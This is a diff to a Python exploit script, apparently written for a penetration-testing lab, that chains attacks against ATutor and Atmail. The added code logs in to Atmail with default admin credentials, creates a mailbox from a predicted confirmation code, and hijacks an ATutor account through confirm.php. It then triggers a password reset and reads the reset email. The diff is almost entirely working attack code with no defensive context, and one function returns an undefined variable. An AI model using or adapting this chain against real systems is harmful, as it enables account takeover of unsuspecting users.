@@ -63,7 +63,7 @@ def get_code (domain, id, creation_date):
 
 def hijack_account(ip, email_prefix, domain, member_id):
     email = f"{email_prefix}@{domain}"
-    print(f"Hijacking account {member_id} with email {email}")
+    print(f"Hijacking account {member_id} with email {email}......")
     
     target = f"http://{ip}/ATutor/confirm.php?id={member_id}&m=0&e={email}"
     r = requests.get(target, allow_redirects=False)
@@ -72,7 +72,38 @@ def hijack_account(ip, email_prefix, domain, member_id):
     else:
         return False
 
-def atmail_login(atmail_ip):
+def password_reminder(ip, email_prefix, domain):
+    email = f"{email_prefix}@{domain}"
+    print(f"Sending reset password email for email {email}.....")
+
+    s = requests.Session()
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+    }
+    s.headers.update(headers)
+
+    target = f"http://{ip}/ATutor/password_reminder.php"
+    data = {
+        "form_password_reminder": "true",
+        "form_email": email,
+        "submit": "Submit"
+    }
+
+    proxies = {
+        'http': 'http://127.0.0.1:8080'
+    }
+    s.proxies.update(proxies)
+
+    r = s.post(target, data=data)
+
+    if re.findall('No account found with that email address', r.text):
+        raise Exception("Password reset unsuccessful!")
+    print("Password reset successful!")
+    return s
+
+def atmail_admin_login(atmail_ip):
     print("Logging in to atmail......")
     USERNAME = 'admin'
     PASSWORD = 'admin'
@@ -85,10 +116,10 @@ def atmail_login(atmail_ip):
     }
     s.headers.update(headers)
 
-    proxies = {
-        'http': 'http://127.0.0.1:8080'
-    }
-    s.proxies.update(proxies)
+    # proxies = {
+    #     'http': 'http://127.0.0.1:8080'
+    # }
+    # s.proxies.update(proxies)
 
     target = f'http://{atmail_ip}/index.php/admin/index/login'
     data = {
@@ -101,6 +132,7 @@ def atmail_login(atmail_ip):
 
     if re.match('Authentication failed, try again', r.text):
         raise Exception("Atmail admin authentication failed")
+    print("Login successful!")
     return s
 
 def create_atmail_user(session, ip, email_prefix, domain):
@@ -115,12 +147,46 @@ def create_atmail_user(session, ip, email_prefix, domain):
     r = session.post(target, data=data)
 
     if re.findall('Currently using.*of quota', r.text):
+        print("User creation sueccessful!")
         return s
     elif re.findall(f'{email_prefix}@{domain} already exists', r.text):
         print("User already exists!")
         return session
     else:
         raise Exception("Atmail fail to create user!")
+
+def atmail_user_login(atmail_ip, email_prefix, domain):
+    s = requests.Session()
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+    }
+    s.headers.update(headers)
+
+    proxies = {
+        'http': 'http://127.0.0.1:8080'
+    }
+    s.proxies.update(proxies)
+
+    target = f"http://{atmail_ip}/index.php/mail/auth/processlogin"
+    data = {
+        "emailName": email_prefix,
+        "emailDomain": domain,
+        "email": f"{email_prefix}%40{domain}",
+        "password": "bromine",
+        "MailType": "IMAP",
+        "Language": "",
+        "emailDomainDefault": "",
+        "cssStyle": "original",
+        "requestedServer": ""
+    }
+    r = s.post(target, data = data)
+
+    if re.findall('WebAdmin Control Panel', r.text):
+        raise Exception("Login unsuccessful!")
+    print("Login sueccessful!")
+    return s
 
 def main():
     if len(sys.argv) != 3:
@@ -149,13 +215,17 @@ def main():
 
     email_prefix = get_code(DOMAIN, member_id, creation_date)
 
-    # hijack_account(ip, email_prefix, DOMAIN, member_id)
+    atmail_admin_session = atmail_admin_login(atmail_ip)
 
-    atmail_session = atmail_login(atmail_ip)
+    create_atmail_user(atmail_admin_session, atmail_ip, email_prefix, DOMAIN)
 
-    # atmail_session.get(f"http://{atmail_ip}/index.php/admin/users/list/domain/{DOMAIN}")
+    hijack_account(ip, email_prefix, DOMAIN, member_id)
 
-    create_atmail_user(atmail_session, atmail_ip, email_prefix, DOMAIN)
+    password_reminder(ip, email_prefix, DOMAIN)
 
+    atmail_user_session = atmail_user_login(atmail_ip, email_prefix, DOMAIN)
+
+    get_email_code(atmail_user_session, atmail_ip)
+    
 if __name__ == '__main__':
     main()
